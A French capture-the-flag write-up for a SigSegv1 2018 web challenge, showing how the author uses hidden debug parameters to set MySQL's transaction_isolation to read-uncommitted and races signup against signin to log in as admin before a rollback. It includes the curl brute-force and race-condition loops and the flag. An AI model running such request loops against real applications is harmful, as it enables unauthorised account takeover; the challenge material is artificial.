#  SigSegv1 CTF 2018

**Category:** Misc/Web |
**Points:** 500 |
**Solves:** 1 |
**Description:**

> LOL mon pote dit qu'il peut se connecter en tant qu'admin sur mon app.
> Je le crois pas, mais avant d'accepter son challenge, est-ce que tu peux vérifier que c'est bon stp ?

___

## TL;DR


The game. Si t'as pas le temps de lire, reviens demain.

## WRITE-UP

* __Première étape__ : découvrir le chall.

Tout d'abord, on voit que le challenge possède seulement 2 pages:<br>
\- Une page de création de compte (`/signUp`),<br>
\- Une page de login (`/signIn`).

Premier test que j'ai fait : essayer de créer un compte :

```
>>> curl -s http://localhost:8000/signUp -d 'inputName=admin&inputPassword=perte'
{"error": "(u'User creation has been disabled, changes have been canceled.',)"}
```

Well, la création d'utilisateur a été désactivée.
On se dit que le but, ça va être de faire en sorte de pouvoir créer l'utilisateur qu'on veut.


* __Deuxième étape__ : allumer son cerveau

En regardant un peu les deux pages, je vois des commentaires :

```
<!--
30/11/18 - added a stored procedure to add users

BEGIN
    IF (select exists (select 1 from tbl_user where login = p_login)) THEN
        select 'Username exists!';
    ELSE
        START TRANSACTION;
        insert into tbl_user
        (
            login,
            password
        )
        values
        (
            p_login,
            p_password
        );
    END IF;
END$$
DELIMITER ;

--------------------------------------------------------------------------------

01/12/18 - my friend told me not to store passwords as plaintext...
Removed everything from the database and disabled persistence of changes in db until I fix this.
-->


******************


<!--

30/11/18 - added secret form parameters debugVar and debugVal to help debug the app.

-->
```

Ici, il y a deux choses importantes :<br>
\- les 2 paramètres que l'on peut rajouter,<br>
\- le fait que l'admin a désactivé la persistance.

Le message est clair, il semblerait qu'il y ait un rollback qui soit fait.

En ayant ces informations, j'ai testé de faire une race condition en créant l'utilisateur `admin`,
puis me connecter directement juste après, avant que le rollback ne soit fait.
Mais dans ce cas, non seulement je ne me servais pas des paramètres donnés en commentaire, et puis
surtout ... ça ne fonctionnait pas :)




* __Troisième étape__ : utilisation des params + bruteforce

Ce step est assez simple.
J'ai récupéré une bonne partie des variables systèmes de MySQL : 
```
>>> curl -s 'https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html'| awk -F'[<>]' '/server-system.*class="literal/{!arr[$5]++}END{for (k in arr){print k}}' >> all_mysql_sysvar.lst
```

Ca fait une petite liste de presque 300 vars.
```
>>> curl -s http://localhost:8000/signIn -d 'inputName=admin&inputPassword=lel&debugVar=connect_timeout&debugVal=lel'
{"html": "<span>Forbidden variable name!</span>"}
```

Petite surprise, certaines sont interdites : j'ai donc "bruteforcé" pour connaître les vars autorisées.

```
>>> while read VAR; do curl -s http://localhost:8000/signIn -d "inputName=admin&inputPassword=lel&debugVar=$VAR&debugVal=lel" |grep -q Forbidden || echo $VAR ; done < all_mysql_sysvar.lst >> allowed_mysql_vars.lst
>>> wc -l allowed_mysql_vars.lst 
122 allowed_mysql_vars.lst
```

Bien, je me retrouve avec 122 variables à RTFM...
Avec l'idée du challenge, le `rollback`, ça permet de s'orienter vers certaines variables.


* __Dernière étape__ : payload + flag

Je vous invite à lire les liens suivants :
```
https://en.wikipedia.org/wiki/Isolation_(database_systems)
https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_transaction_isolation
https://inshallhack.org/production_debugging_sigsegv1_2018/
```

Le post de Siben sur inshallhack est génial, avec schématisation (wikipedia ¢) des dirty reads.

Après avoir bien RTFM, il ne reste plus qu'à créer le payload.
Ce qu'il faut faire :<br>
\- Créer un user admin/admin,<br>
\- Instantanément, il faut directement faire lire à la DB les changements non commités :<br>
`transaction_isolation -> read-uncommitted`,<br>
\- Et on essaye de se connecter ensuite.

En BASH, ça donne simplement ça :

```
>>> while true ; do curl -s 'http://localhost:8000/signUp' --data 'inputName=admin&inputPassword=admin' & \
> curl -s 'http://localhost:8000/signIn' --data 'inputName=admin&inputPassword=admin&debugVar=transaction_isolation&debugVal=read-uncommitted' & \
> curl -s 'http://localhost:8000/signUp' --data 'inputName=admin&inputPassword=admin' ; done
```

Il suffit d'attendre un peu :

`{"gg": "GG! Flag: sigsegv{1s0l4t10n_mY_455}!"}`

* __Conclusion__ :

Un superbe challenge !
Personellement, j'avais jamais trop travaillé sur MySQL de façon approfondie, et j'ai appris
énormément de choses sur le fonctionnement d'une DB (MySQL).
Merci à toi SIben pour l'idée du challenge, de m'avoir fait confiance en me le faisant tester en
"avant-première", avant qu'il soit push sur le SigSev1 CTF.
Et surtout : the game.

Enjoy,<br>
\- [Notfound](https://twitter.com/Notfound404__)
